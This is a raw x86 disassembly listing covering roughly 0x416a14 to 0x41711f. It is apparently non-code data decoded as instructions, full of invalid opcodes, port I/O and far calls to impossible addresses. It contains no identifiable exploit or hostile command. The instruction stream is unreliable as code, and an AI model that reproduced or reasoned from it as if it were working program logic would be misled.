  416a14:	shl    DWORD PTR [ebx+0x60],0xa4
  416a18:	shl    ebp,1
  416a1a:	add    BYTE PTR [eax],al
  416a1c:	add    BYTE PTR [eax],bl
  416a1e:	xchg   ebp,eax
  416a1f:	xchg   edi,eax
  416a20:	xchg   ebp,eax
  416a21:	xchg   edi,eax
  416a22:	xchg   edi,eax
  416a23:	jns    0x416a42
  416a25:	cs cs and al,0x17
  416a29:	push   ebp
  416a2a:	pop    ss
  416a2b:	and    al,0x4d
  416a2d:	and    al,0x2e
  416a2f:	cs cs sbb eax,0x8c2c233b
  416a36:	add    eax,0xfe10008e
  416a3b:	mov    cs,WORD PTR [ecx-0x7b777a8c]
  416a41:	test   BYTE PTR [edx-0x7b],bh
  416a44:	nop
  416a45:	out    0xdf,al
  416a47:	(bad)  
  416a49:	fiadd  WORD PTR ds:0xe82600e9
  416a4f:	call   0xf6215648
  416a54:	fcomp  st(0)
  416a56:	cmc    
  416a57:	fdiv   st,st(5)
  416a59:	fdiv   st,st(5)
  416a5b:	fcomip st,st(5)
  416a5d:	fcomp  st(5)
  416a5f:	jecxz  0x4169fa
  416a61:	jl     0x416adf
  416a63:	jb     0x416ac8
  416a65:	pop    edi
  416a66:	outs   dx,DWORD PTR ds:[esi]
  416a67:	jbe    0x416adb
  416a69:	jl     0x416ae1
  416a6b:	cmp    BYTE PTR [eax-0x76],dh
  416a6e:	fadd   DWORD PTR [esi-0x3a3a3506]
  416a74:	add    BYTE PTR [eax],al
  416a76:	add    BYTE PTR [eax-0x6b],bl
  416a79:	xchg   ebp,eax
  416a7a:	xchg   edi,eax
  416a7b:	xchg   ebp,eax
  416a7c:	xchg   edi,eax
  416a7d:	sahf   
  416a7e:	and    eax,0x4d4d4d2e
  416a83:	pop    ss
  416a84:	dec    ebp
  416a85:	pop    ss
  416a86:	push   ebp
  416a87:	dec    ebp
  416a88:	cs adc eax,0x20231d2f
  416a8e:	sbb    DWORD PTR [edi-0x3],edi
  416a91:	(bad)  
  416a92:	call   0x8496:0x89fe879a
  416a99:	xchg   BYTE PTR [edx+0x7a84848a],cl
  416a9f:	xchg   ch,ch
  416aa1:	fisttp WORD PTR [esi]
  416aa3:	push   es
  416aa4:	push   cs
  416aa5:	jmp    0xe92b5393
  416aaa:	call   0xde4c569a
  416aaf:	cmc    
  416ab0:	fdiv   st,st(5)
  416ab2:	fcomp  st(0)
  416ab4:	fdiv   st,st(5)
  416ab6:	fdiv   st,st(5)
  416ab8:	fild   WORD PTR [edi]
  416aba:	loope  0x416ab4
  416abc:	adc    bh,BYTE PTR [esp+edi*2+0x76]
  416ac0:	jo     0x416b21
  416ac2:	outs   dx,DWORD PTR ds:[esi]
  416ac3:	jb     0x416b41
  416ac5:	cdq    
  416ac6:	aas    
  416ac7:	js     0x416ab8
  416ac9:	int3   
  416aca:	(bad)  
  416acc:	(bad)
  416acf:	jmp    0x20416ad4
  416ad4:	xchg   ebp,eax
  416ad5:	xchg   ebp,eax
  416ad6:	xchg   ebp,eax
  416ad7:	xchg   edi,eax
  416ad8:	xchg   ebp,eax
  416ad9:	xchg   ebp,eax
  416ada:	cwde   
  416adb:	dec    ecx
  416adc:	cs cmp eax,0x17174d17
  416ae2:	pop    ss
  416ae3:	dec    ebp
  416ae4:	and    al,0x2e
  416ae6:	cmp    esp,DWORD PTR cs:[ebx]
  416ae9:	sub    ah,BYTE PTR [ebx]
  416aeb:	pop    edi
  416aec:	std    
  416aed:	call   0x8674:0x8dfe8c87
  416af4:	add    al,0x8a
  416af6:	add    BYTE PTR [ebx],dl
  416af8:	mov    BYTE PTR [ebp+eax*4-0x200a127c],al
  416aff:	out    0x6,al
  416b01:	jmp    0xdc2b54ee
  416b06:	call   0xe93856f3
  416b0b:	add    BYTE PTR ds:0xd81c00f5,al
  416b11:	cmc    
  416b12:	fcomp  st(0)
  416b14:	fsub   st,st(1)
  416b16:	in     al,dx
  416b17:	in     al,dx
  416b18:	adc    BYTE PTR [esp+edi*2+0x76],bh
  416b1c:	pop    edi
  416b1d:	pop    edi
  416b1e:	jbe    0x416b9c
  416b20:	adc    cl,bh
  416b22:	loope  0x416b00
  416b24:	cmc    
  416b25:	fcomp  st(0)
  416b27:	(bad)  
  416b29:	retf   0xe9de
  416b2c:	add    BYTE PTR [eax],al
  416b2e:	push   es
  416b2f:	xchg   ebp,eax
  416b30:	add    BYTE PTR [edx-0x69],dl
  416b33:	adc    ch,BYTE PTR [esi]
  416b35:	push   ebp
  416b36:	push   ebp
  416b37:	push   ebp
  416b38:	dec    ebp
  416b39:	pop    ss
  416b3a:	dec    ebp
  416b3b:	dec    ebp
  416b3c:	and    al,0x2e
  416b3e:	sbb    eax,0x23202023
  416b43:	cmp    BYTE PTR [ecx+0x7f419a8c],al
  416b49:	ins    BYTE PTR es:[edi],dx
  416b4a:	mov    cl,BYTE PTR [edx-0x797c7975]
  416b50:	test   BYTE PTR [esp+eax*4-0x2020127b],al
  416b57:	(bad)  
  416b59:	jmp    0xdc2b5446
  416b5e:	call   0xc838574d
  416b63:	out    0xf5,al
  416b65:	fdiv   st,st(5)
  416b67:	cmc    
  416b68:	cmc    
  416b69:	fcomip st,st(5)
  416b6b:	fsub   st,st(1)
  416b6d:	loop   0x416b3e
  416b6f:	in     al,dx
  416b70:	loop   0x416b84
  416b72:	jl     0x416be3
  416b74:	arpl   WORD PTR [edi+0x76],bx
  416b77:	jl     0x416bf5
  416b79:	jecxz  0x416b5c
  416b7b:	loope  0x416b55
  416b7d:	fcomp  st(7)
  416b7f:	fcomp  st(6)
  416b81:	fsubp  st(1),st
  416b83:	enter  0x0,0x4
  416b87:	xchg   ebp,eax
  416b88:	add    BYTE PTR [edi+edx*4-0x6b],dl
  416b8c:	xchg   edi,eax
  416b8d:	cdq    
  416b8e:	and    al,0x17
  416b90:	dec    ebp
  416b91:	and    al,0x4d
  416b93:	and    al,0x24
  416b95:	and    al,0x2e
  416b97:	cs sbb eax,0x234e2018
  416b9d:	sub    al,0x7e
  416b9f:	mov    esi,edi
  416ba1:	lea    ebp,[eax+ecx*4-0x7d]
  416ba5:	mov    al,BYTE PTR [esi-0x7b77797d]
  416bab:	test   DWORD PTR [ebp+0xedf0b85],eax
  416bb1:	(bad)  
  416bb3:	jmp    0xe92a54a1
  416bb8:	jmp    0x416bc4
  416bba:	imul   dl
  416bbc:	jmp    0x416b9d
  416bbe:	(bad)  
  416bc0:	cmc    
  416bc1:	fdiv   st,st(5)
  416bc3:	(bad)  
  416bc5:	loope  0x416ba8
  416bc7:	clc    
  416bc8:	clc    
  416bc9:	in     al,dx
  416bca:	loope  0x416bde
  416bcc:	jb     0x416c3e
  416bce:	pop    edi
  416bcf:	arpl   WORD PTR [eax+0x7c],dx
  416bd2:	jl     0x416be6
  416bd4:	loope  0x416bb7
  416bd6:	pop    es
  416bd7:	fcomp  st(0)
  416bd9:	(bad)  
  416bdb:	fsubp  st(1),st
  416bdd:	lds    eax,FWORD PTR [eax]
  416bdf:	add    BYTE PTR [eax],al
  416be1:	cs xchg ebp,eax
  416be3:	xchg   ebp,eax
  416be4:	xchg   ebp,eax
  416be5:	xchg   edi,eax
  416be6:	xchg   ebp,eax
  416be7:	xchg   edi,eax
  416be8:	xchg   ebp,eax
  416be9:	cdq    
  416bea:	and    al,0x4d
  416bec:	dec    ebp
  416bed:	and    al,0x4d
  416bef:	cmp    al,0x4d
  416bf1:	pop    ss
  416bf2:	and    al,0x2f
  416bf4:	and    edx,DWORD PTR [esi]
  416bf6:	and    BYTE PTR [ebx],ah
  416bf8:	cmp    esi,DWORD PTR [eax+eax*4]
  416bfb:	mov    DWORD PTR [ebx+0x6c],esi
  416bfe:	xchg   BYTE PTR [ebx-0x7775797d],al
  416c04:	mov    cl,BYTE PTR [edi+0x7a7aa485]
  416c0a:	rcr    edi,1
  416c0c:	fisttp WORD PTR [esi]
  416c0e:	fsubp  st(1),st
  416c10:	add    al,0xe8
  416c12:	add    ebx,ebp
  416c14:	add    al,0xf6
  416c16:	add    esi,ebx
  416c18:	push   es
  416c19:	cmc    
  416c1a:	add    BYTE PTR [edx],bl
  416c1c:	fsub   st,st(1)
  416c1e:	loope  0x416c18
  416c20:	clc    
  416c21:	loop   0x416c04
  416c23:	cdq    
  416c24:	jnp    0x416c96
  416c26:	pop    edi
  416c27:	test   BYTE PTR [edx+0x7c],dh
  416c2a:	adc    ah,bl
  416c2c:	in     al,dx
  416c2d:	loope  0x416c07
  416c2f:	fcomp  st(0)
  416c31:	(bad)  
  416c33:	faddp  st(5),st
  416c35:	jmp    0x58416c3a
  416c3a:	xchg   ebp,eax
  416c3b:	xchg   ebp,eax
  416c3c:	xchg   edi,eax
  416c3d:	xchg   ebp,eax
  416c3e:	xchg   edi,eax
  416c3f:	xchg   ebp,eax
  416c40:	xchg   ebp,eax
  416c41:	cdq    
  416c42:	and    al,0x4d
  416c44:	pop    ss
  416c45:	dec    ebp
  416c46:	dec    ebp
  416c47:	push   ebp
  416c48:	cmp    al,0x2e
  416c4a:	and    esp,DWORD PTR cs:[eax]
  416c4d:	and    BYTE PTR [eax],ah
  416c4f:	sbb    eax,0x9660251d
  416c54:	ins    BYTE PTR es:[edi],dx
  416c55:	test   BYTE PTR [ebx-0x757c7576],al
  416c5b:	mov    BYTE PTR [edx+0x7a],bh
  416c5e:	ins    BYTE PTR es:[edi],dx
  416c5f:	ins    BYTE PTR es:[edi],dx
  416c60:	pusha  
  416c61:	pusha  
  416c62:	cli    
  416c63:	(bad)  
  416c65:	fsubp  st(1),st
  416c67:	call   0xeb2d5854
  416c6c:	div    dh
  416c6e:	imul   dl
  416c70:	test   ch,0xf5
  416c73:	cmc    
  416c74:	fdiv   st,st(5)
  416c76:	fdiv   st,st(5)
  416c78:	loope  0x416c52
  416c7a:	in     al,dx
  416c7b:	clc    
  416c7c:	loop   0x416c6a
  416c7e:	fsubr  st(4),st
  416c80:	jns    0x416ce5
  416c82:	arpl   WORD PTR [ecx+0x43],di
  416c85:	jl     0x416c97
  416c87:	clc    
  416c88:	in     al,dx
  416c89:	loope  0x416c63
  416c8b:	fcomp  st(0)
  416c8d:	(bad)  
  416c8f:	faddp  st(5),st
  416c91:	lds    eax,FWORD PTR [eax]
  416c93:	add    BYTE PTR ds:0x97530095,al
  416c99:	xchg   ebp,eax
  416c9a:	xchg   ecx,eax
  416c9b:	and    al,0x4d
  416c9d:	pop    ss
  416c9e:	push   ebp
  416c9f:	cmp    al,0x4d
  416ca1:	push   ebp
  416ca2:	and    al,0x1d
  416ca4:	and    esp,DWORD PTR [eax]
  416ca6:	sbb    BYTE PTR ds:0x842f1d2f,bl
  416cac:	pusha  
  416cad:	test   BYTE PTR [edx-0x777c7c7d],cl
  416cb3:	mov    BYTE PTR [edx+0x6c],bh
  416cb6:	je     0x416d2c
  416cb8:	jae    0x416d2e
  416cba:	jae    0x416c78
  416cbc:	retf   0xe9e9
  416cbf:	call   0xf72d56ce
  416cc4:	jmp    0xaf6:0xf6c6f6f6
  416ccb:	out    0xf5,al
  416ccd:	cmc    
  416cce:	fdiv   st,st(5)
  416cd0:	fcomp  st(0)
  416cd2:	in     al,dx
  416cd3:	in     al,dx
  416cd4:	clc    
  416cd5:	clc    
  416cd6:	loope  0x416cb9
  416cd8:	loop   0x416d53
  416cda:	jo     0x416d4c
  416cdc:	jb     0x416d5a
  416cde:	jno    0x416cf0
  416ce0:	clc    
  416ce1:	in     al,dx
  416ce2:	loope  0x416cc0
  416ce4:	fcomp  st(0)
  416ce6:	fcomp  st(7)
  416ce8:	(bad)  
  416cea:	jmp    0x1416cef
  416cef:	xchg   esp,eax
  416cf0:	add    DWORD PTR [edi+0x51009505],edx
  416cf6:	mov    edx,DWORD PTR ds:0x55175555
  416cfc:	cmp    al,0x24
  416cfe:	das    
  416cff:	and    esp,DWORD PTR [eax]
  416d01:	and    BYTE PTR [ebx],ah
  416d03:	sbb    eax,0x8a2e2e1d
  416d08:	test   DWORD PTR [edx-0x777c7c76],ecx
  416d0e:	test   DWORD PTR [edx+0x74],edi
  416d11:	add    BYTE PTR [eax-0x76767273],0xab
  416d18:	fld1   
  416d1a:	jmp    0x416d04
  416d1c:	imul   dl
  416d1e:	imul   dl
  416d20:	test   dh,0xf6
  416d23:	(bad)  
  416d24:	jmp    0xf5f5:0xf5df0aea
  416d2b:	fcomp  st(0)
  416d2d:	fsub   st(4),st
  416d2f:	clc    
  416d30:	clc    
  416d31:	in     al,dx
  416d32:	loope  0x416d15
  416d34:	loope  0x416d25
  416d36:	jo     0x416dae
  416d38:	jl     0x416db6
  416d3a:	iret   
  416d3b:	iret   
  416d3c:	in     al,dx
  416d3d:	in     al,dx
  416d3e:	in     al,dx
  416d3f:	loope  0x416d1d
  416d41:	fcomp  st(0)
  416d43:	ffreep st(5)
  416d45:	jmp    0x416e12
  416d4a:	add    BYTE PTR ds:0x9597956f,ch
  416d50:	xchg   ebp,eax
  416d51:	xchg   ebp,eax
  416d52:	xchg   edi,eax
  416d53:	xchg   ebx,eax
  416d54:	cmp    eax,0x553c4d24
  416d59:	dec    ebp
  416d5a:	cs sbb eax,0x3b232018
  416d60:	cs cs and al,0x4d
  416d64:	mov    BYTE PTR es:[edx+0x6c84868a],cl
  416d6b:	je     0x416ced
  416d6d:	mov    DWORD PTR [ecx-0x1657302],ecx
  416d73:	mov    ss,WORD PTR [edx+0x5ebf4d0]
  416d79:	add    BYTE PTR [eax],cl
  416d7b:	test   BYTE PTR [eax],0x4
  416d7e:	loopne 0x416d8a
  416d80:	imul   cl
  416d82:	add    al,0xd8
  416d84:	add    BYTE PTR [ebx],bl
  416d86:	loope  0x416d69
  416d88:	in     al,dx
  416d89:	clc    
  416d8a:	clc    
  416d8b:	in     al,dx
  416d8c:	in     al,dx
  416d8d:	in     al,dx
  416d8e:	fucom  st(4)
  416d90:	jbe    0x416e04
  416d92:	jl     0x416da4
  416d94:	iret   
  416d95:	clc    
  416d96:	clc    
  416d97:	clc    
  416d98:	loop   0x416d77
  416d9a:	fcomp  st(0)
  416d9c:	ffreep st(5)
  416d9e:	fcmovnbe st,st(7)
  416da0:	call   0x1416da5
  416da5:	inc    esi
  416da6:	add    DWORD PTR [edx+0x2a009505],ecx
  416dac:	nop
  416dad:	sub    ebp,DWORD PTR [esi]
  416daf:	cmp    al,0x55
  416db1:	and    al,0x24
  416db3:	sbb    eax,0x3b232023
  416db8:	cs cs cs and al,0x24
  416dbd:	mov    cl,BYTE PTR es:[eax+0x736c8584]
  416dc4:	lea    ecx,[ecx-0x71787879]
  416dca:	call   0xf6eb:0xb601fc8e
  416dd1:	div    dh
  416dd3:	jmp    0x416dbf
  416dd5:	jmp    0xf6ea:0x2300f604
  416ddc:	jmp    0x416db5
  416dde:	cmc    
  416ddf:	fcomp  st(4)
  416de1:	fsub   st,st(1)
  416de3:	in     al,dx
  416de4:	clc    
  416de5:	clc    
  416de6:	loop   0x416dd4
  416de8:	in     al,dx
  416de9:	loop   0x416dcd
  416deb:	jecxz  0x416e5f
  416ded:	jl     0x416e01
  416def:	iret   
  416df0:	iret   
  416df1:	iret   
  416df2:	clc    
  416df3:	in     al,dx
  416df4:	fucom  st(1)
  416df6:	fcomp  st(7)
  416df8:	fsubp  st(1),st
  416dfa:	xlat   BYTE PTR ds:[ebx]
  416dfb:	xlat   BYTE PTR ds:[ebx]
  416dfc:	xlat   BYTE PTR ds:[ebx]
  416dfd:	add    BYTE PTR [eax],al
  416dff:	add    BYTE PTR [eax],al
  416e01:	pop    eax
  416e02:	inc    esi
  416e03:	inc    edx
  416e04:	xchg   esp,eax
  416e05:	xchg   ebp,eax
  416e06:	xchg   ebp,eax
  416e07:	xchg   ebp,eax
  416e08:	xchg   edi,eax
  416e09:	fwait
  416e0a:	jno    0x416e30
  416e0c:	push   ebp
  416e0d:	pop    ss
  416e0e:	and    al,0x2f
  416e10:	sbb    eax,0x1d232023
  416e15:	and    al,0x17
  416e17:	pop    ss
  416e18:	and    al,0x3c
  416e1a:	jb     0x416dab
  416e1c:	test   DWORD PTR [edx-0x58],edi
  416e1f:	jae    0x416ea0
  416e21:	mov    DWORD PTR [edi+eax*4-0x71650102],ecx
  416e28:	xchg   edx,eax
  416e29:	std    
  416e2a:	std    
  416e2b:	scas   al,BYTE PTR es:[edi]
  416e2c:	test   BYTE PTR [ebx],0xc7
  416e2f:	(bad)  
  416e30:	loopne 0x416e1c
  416e32:	(bad)  
  416e33:	add    esp,eax
  416e35:	imul   dl
  416e37:	mov    BYTE PTR [ebx],0xf6
  416e3a:	or     bl,bh
  416e3c:	cmc    
  416e3d:	loope  0x416e20
  416e3f:	loope  0x416e2d
  416e41:	clc    
  416e42:	in     al,dx
  416e43:	in     al,dx
  416e44:	in     al,dx
  416e45:	loop   0x416e33
  416e47:	in     al,dx
  416e48:	loop   0x416ebc
  416e4a:	jl     0x416e1b
  416e4c:	iret   
  416e4d:	iret   
  416e4e:	clc    
  416e4f:	clc    
  416e50:	in     al,dx
  416e51:	loope  0x416e34
  416e53:	fcomp  st(6)
  416e55:	jmp    0xd82d4431
  416e5a:	add    BYTE PTR [eax],al
  416e5c:	add    BYTE PTR [eax+0x4b],bl
  416e5f:	dec    ebx
  416e60:	test   BYTE PTR [ebp-0x646a6a69],dl
  416e66:	jno    0x416eb5
  416e68:	cmp    al,0x24
  416e6a:	cs sbb eax,0x1d232323
  416e70:	cs dec ebp
  416e72:	and    al,0x24
  416e74:	dec    edi
  416e75:	adc    eax,0x746c9f78
  416e7a:	jae    0x416efb
  416e7c:	mov    DWORD PTR [esp+ecx*4-0x71026d72],ecx
  416e83:	xchg   edx,eax
  416e84:	test   eax,0xedab8c89
  416e89:	push   es
  416e8a:	in     eax,dx
  416e8b:	push   cs
  416e8c:	push   cs
  416e8d:	in     eax,dx
  416e8e:	push   cs
  416e8f:	fild   WORD PTR [esi]
  416e91:	push   cs
  416e92:	or     ch,cl
  416e94:	not    edi
  416e96:	jmp    0x416e77
  416e98:	fcomp  st(0)
  416e9a:	fsub   st(4),st
  416e9c:	clc    
  416e9d:	in     al,dx
  416e9e:	fucom  st(1)
  416ea0:	in     al,dx
  416ea1:	loop   0x416e8f
  416ea3:	in     al,dx
  416ea4:	loop   0x416eb8
  416ea6:	aas    
  416ea7:	adc    dh,BYTE PTR [ecx-0x31]
  416eaa:	clc    
  416eab:	loop   0x416e99
  416ead:	cmc    
  416eae:	fadd   st,st(5)
  416eb0:	fmulp  st(0),st
  416eb2:	xlat   BYTE PTR ds:[ebx]
  416eb3:	aad    0xb7
  416eb5:	xlat   BYTE PTR ds:[ebx]
  416eb6:	add    BYTE PTR [eax],al
  416eb8:	add    BYTE PTR [eax+0x4b],bl
  416ebb:	dec    ebx
  416ebc:	dec    eax
  416ebd:	fwait
  416ebe:	xchg   ebp,eax
  416ebf:	xchg   ebp,eax
  416ec0:	xchg   ebp,eax
  416ec1:	fwait
  416ec2:	jno    0x416f11
  416ec4:	cmp    al,0x2e
  416ec6:	adc    eax,0x2f23233b
  416ecb:	cs dec ebp
  416ecd:	and    al,0x2e
  416ecf:	cmp    eax,0x6c723c17
  416ed4:	je     0x416f49
  416ed6:	lea    ecx,[ecx-0x766d7157]
  416edc:	test   al,0x83
  416ede:	mov    ebp,0x72717285
  416ee3:	js     0x416f38
  416ee5:	push   ds
  416ee6:	dec    edi
  416ee7:	push   ebx
  416ee8:	sub    ecx,DWORD PTR [edi+0x2b]
  416eeb:	dec    edi
  416eec:	sub    esi,DWORD PTR [edi]
  416eee:	pop    ss
  416eef:	aaa    
  416ef0:	adc    BYTE PTR [edi],dh
  416ef2:	adc    DWORD PTR [edi],ecx
  416ef4:	cmc    
  416ef5:	fsubr  st(1),st
  416ef7:	loope  0x416ee5
  416ef9:	in     al,dx
  416efa:	loope  0x416edd
  416efc:	loope  0x416eea
  416efe:	loop   0x416ee2
  416f00:	clc    
  416f01:	adc    bh,BYTE PTR [esp+edi*2+0x12]
  416f05:	iret   
  416f06:	clc    
  416f07:	in     al,dx
  416f08:	loope  0x416ee2
  416f0a:	ffreep st(0)
  416f0c:	rcr    cl,1
  416f0e:	xlat   BYTE PTR ds:[ebx]
  416f0f:	jmp    0x416ec8
  416f11:	xlat   BYTE PTR ds:[ebx]
  416f12:	add    BYTE PTR [eax],al
  416f14:	add    BYTE PTR [ebx+ecx*2],al
  416f17:	dec    ebx
  416f18:	cmp    cl,BYTE PTR [edi+0x4009504]
  416f1e:	cdq    
  416f1f:	cmp    al,0x55
  416f21:	cs add al,0x1d
  416f24:	add    BYTE PTR [eax+0x2e],cl
  416f27:	and    al,0x4d
  416f29:	and    al,0x2e
  416f2b:	and    al,0x17
  416f2d:	cmp    al,0x50
  416f2f:	pusha  
  416f30:	jae    0x416ebf
  416f32:	mov    esi,edi
  416f34:	(bad)  
  416f35:	je     0x416ebd
  416f37:	jb     0x416f8c
  416f39:	ja     0x416f8e
  416f3b:	jno    0x416f5b
  416f3d:	push   ebx
  416f3e:	push   ds
  416f3f:	imul   ebp,DWORD PTR [ebx+0x4f],0x4f
  416f43:	dec    ebp
  416f44:	cmp    eax,0x2f252e3d
  416f49:	cmp    ecx,DWORD PTR [esi+0x4e]
  416f4c:	xor    al,0x33
  416f4e:	dec    esi
  416f4f:	aaa    
  416f50:	loope  0x416f33
  416f52:	loope  0x416f30
  416f54:	loope  0x416f33
  416f56:	loope  0x416f3a
  416f58:	in     al,dx
  416f59:	in     al,dx
  416f5a:	loop   0x416f54
  416f5c:	clc    
  416f5d:	clc    
  416f5e:	adc    bh,BYTE PTR [esp+edi*2-0x1d]
  416f62:	clc    
  416f63:	pop    es
  416f64:	loope  0x416f3e
  416f66:	fistp  QWORD PTR [ebx-0x482a2574]
  416f6c:	aad    0xd7
  416f6e:	add    BYTE PTR [eax],al
  416f70:	add    BYTE PTR [ebx],bh
  416f72:	dec    ebx
  416f73:	dec    ebx
  416f74:	dec    ebx
  416f75:	inc    edx
  416f76:	xchg   esp,eax
  416f77:	xchg   ebp,eax
  416f78:	xchg   edi,eax
  416f79:	xchg   ebp,eax
  416f7a:	cdq    
  416f7b:	and    al,0x4d
  416f7d:	sbb    eax,0x1d1d1d23
  416f82:	dec    ebp
  416f83:	push   ebp
  416f84:	and    al,0x24
  416f86:	dec    ebp
  416f87:	and    al,0x4d
  416f89:	cmp    al,0x7c
  416f8b:	fs jae 0x416f1b
  416f8e:	cmp    BYTE PTR [edx+0x78],0x71
  416f92:	push   ds
  416f93:	push   ebx
  416f94:	dec    edi
  416f95:	dec    edi
  416f96:	push   ebx
  416f97:	push   ds
  416f98:	push   ebx
  416f99:	push   ds
  416f9a:	push   ebx
  416f9b:	dec    edi
  416f9c:	dec    edi
  416f9d:	cmp    eax,0x34342f2f
  416fa2:	xor    al,0x23
  416fa4:	xor    esp,DWORD PTR [eax]
  416fa6:	sub    ch,BYTE PTR [edx]
  416fa8:	xor    ebp,DWORD PTR [edx]
  416faa:	sub    DWORD PTR [eax+0x7],ebx
  416fad:	add    BYTE PTR ds:0x1dd01e1,al
  416fb3:	loope  0x416fb9
  416fb5:	in     al,dx
  416fb6:	add    BYTE PTR [edx],dl
  416fb8:	iret   
  416fb9:	clc    
  416fba:	jno    0x417038
  416fbc:	jl     0x416fa1
  416fbe:	in     al,dx
  416fbf:	loope  0x416f99
  416fc1:	(bad)  
  416fc3:	mov    dh,0x6d
  416fc5:	int    0xd7
  416fc7:	xlat   BYTE PTR ds:[ebx]
  416fc8:	(bad)  
  416fc9:	xlat   BYTE PTR ds:[ebx]
  416fca:	add    BYTE PTR [eax],al
  416fcc:	add    al,0x4b
  416fce:	add    BYTE PTR [esi+ebx*2-0x6b],dl
  416fd2:	xchg   ebp,eax
  416fd3:	xchg   edi,eax
  416fd4:	xchg   ecx,eax
  416fd5:	adc    eax,0x153b1d2e
  416fda:	cs pop ss
  416fdc:	and    al,0x24
  416fde:	dec    ebp
  416fdf:	cmp    al,0x55
  416fe1:	dec    ebp
  416fe2:	cmp    al,0x3c
  416fe4:	pop    ss
  416fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fe6:	ins    BYTE PTR es:[edi],dx
  416fe7:	js     0x417020
  416fe9:	push   ebx
  416fea:	ja     0x41703b
  416fec:	push   ebx
  416fed:	ja     0x417042
  416fef:	imul   ecx,DWORD PTR [edi+0x53],0x6b
  416ff3:	outs   dx,BYTE PTR ds:[esi]
  416ff4:	push   esi
  416ff5:	push   esi
  416ff6:	cmp    edi,DWORD PTR [ebx]
  416ff8:	xor    al,0x33
  416ffa:	and    ebp,DWORD PTR [edx]
  416ffc:	and    BYTE PTR [edx],ch
  416ffe:	sub    ch,BYTE PTR [ecx]
  417000:	sub    ch,BYTE PTR [ecx]
  417002:	sub    DWORD PTR [eax],esi
  417004:	sub    DWORD PTR [ecx],ebx
  417006:	adc    ebp,ebx
  417008:	loope  0x416fe7
  41700a:	loope  0x416fed
  41700c:	loope  0x416ffa
  41700e:	loop   0x416ff2
  417010:	clc    
  417011:	clc    
  417012:	clc    
  417013:	iret   
  417014:	adc    bh,BYTE PTR [esp+edi*2-0x1e]
  417018:	loope  0x417009
  41701a:	cli    
  41701b:	fcmovb st,st(0)
  41701d:	stos   DWORD PTR es:[edi],eax
  41701e:	xchg   ebp,ecx
  417020:	aad    0xeb
  417022:	(bad)  
  417023:	xlat   BYTE PTR ds:[ebx]
  417024:	add    BYTE PTR [eax],al
  417026:	add    al,0x4b
  417028:	add    BYTE PTR [edx],ch
  41702a:	cmp    cl,BYTE PTR [edi+0x15919597]
  417030:	sbb    eax,0x172e151d
  417035:	cmp    al,0x4d
  417037:	and    al,0x24
  417039:	dec    ebp
  41703a:	cmp    al,0x24
  41703c:	dec    ecx
  41703d:	cmp    cl,dl
  41703f:	enter  0x72c2,0x1e
  417043:	push   ebx
  417044:	push   ebx
  417045:	sub    edx,DWORD PTR [ebx]
  417047:	jno    0x41709c
  417049:	dec    edi
  41704a:	dec    edi
  41704b:	sub    esp,DWORD PTR ds:0x333b3425
  417051:	dec    esi
  417052:	sub    ah,BYTE PTR [eax]
  417054:	add    al,0x2a
  417056:	add    BYTE PTR [ecx],cl
  417058:	sub    DWORD PTR [ecx],ebp
  41705a:	sub    DWORD PTR [eax],esi
  41705c:	sub    DWORD PTR [eax],esi
  41705e:	sub    BYTE PTR [eax],dh
  417060:	sbb    al,BYTE PTR [eax]
  417062:	pop    es
  417063:	loope  0x417065
  417065:	push   ss
  417066:	in     al,dx
  417067:	clc    
  417068:	clc    
  417069:	clc    
  41706a:	iret   
  41706b:	clc    
  41706c:	iret   
  41706d:	jl     0x4170eb
  41706f:	jecxz  0x4170e9
  417071:	arpl   WORD PTR [esp+esi*4-0x45],sp
  417075:	mov    WORD PTR [eax+edx*8-0x2828382b],cs
  41707c:	add    BYTE PTR [eax],al
  41707e:	add    BYTE PTR ds:0x514b4b4b,ch
  417084:	dec    ebx
  417085:	ss fwait
  417087:	xchg   ebp,eax
  417088:	xchg   ecx,eax
  417089:	adc    eax,0x3c2e1d1d
  41708e:	cmp    al,0x4d
  417090:	and    al,0x4d
  417092:	cmp    al,0x24
  417094:	dec    ebp
  417095:	cmp    al,0x83
  417097:	ins    DWORD PTR es:[edi],dx
  417098:	scas   al,BYTE PTR es:[edi]
  417099:	rcl    cl,0x86
  41709c:	outs   dx,BYTE PTR ds:[esi]
  41709d:	push   ebx
  41709e:	push   ebx
  41709f:	sub    esp,DWORD PTR [eax-0x6]
  4170a2:	jecxz  0x4170db
  4170a4:	and    eax,0x33343434
  4170a9:	xor    ecx,DWORD PTR [esi+0x2a]
  4170ac:	and    BYTE PTR [eax],al
  4170ae:	add    al,0x29
  4170b0:	add    BYTE PTR [ebx],cl
  4170b2:	xor    BYTE PTR [ecx],ch
  4170b4:	xor    BYTE PTR [ecx],ch
  4170b6:	xor    BYTE PTR [eax],dh
  4170b8:	sub    BYTE PTR [eax],dh
  4170ba:	sub    BYTE PTR [ebx],dl
  4170bc:	in     al,dx
  4170bd:	add    BYTE PTR ds:0xec1700e1,al
  4170c3:	in     al,dx
  4170c4:	clc    
  4170c5:	clc    
  4170c6:	iret   
  4170c7:	clc    
  4170c8:	iret   
  4170c9:	clc    
  4170ca:	adc    dh,BYTE PTR [edx+0x26]
  4170cd:	test   DWORD PTR [edi+0x64],ebx
  4170d0:	jg     0x41705f
  4170d2:	mov    WORD PTR [ebp-0x30],gs
  4170d5:	fcmovnbe st,st(7)
  4170d7:	aad    0xeb
  4170d9:	add    BYTE PTR [eax],al
  4170db:	add    BYTE PTR [eax],al
  4170dd:	sub    al,0x8
  4170df:	adc    ecx,edi
  4170e1:	pfsubr mm1,QWORD PTR [eax]
  4170e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170e6:	in     al,0x1d
  4170e8:	das    
  4170e9:	and    al,0x17
  4170eb:	and    al,0x17
  4170ed:	pop    ss
  4170ee:	dec    ebp
  4170ef:	and    al,0x4d
  4170f1:	cmp    eax,0x643f4949
  4170f6:	je     0x4170a0
  4170f8:	rol    dl,0x7c
  4170fb:	push   ebx
  4170fc:	push   ebx
  4170fd:	jns    0x41708c
  4170ff:	mov    dl,0xbe
  417101:	enter  0x50ef,0x33
  417105:	xor    ebp,DWORD PTR [edx]
  417107:	sub    ch,BYTE PTR [ecx]
  417109:	sub    DWORD PTR ds:0x28110030,eax
  41710f:	xor    BYTE PTR [eax],ch
  417111:	xor    ch,BYTE PTR [eax]
  417113:	xor    ch,BYTE PTR [ecx]
  417115:	xor    BYTE PTR [edx],dh
  417117:	sbb    DWORD PTR [ecx],edx
  417119:	loope  0x4170fc
  41711b:	loope  0x417109
  41711d:	loop   0x41710b
  41711f:	add    BYTE PTR [eax+edi*8],al
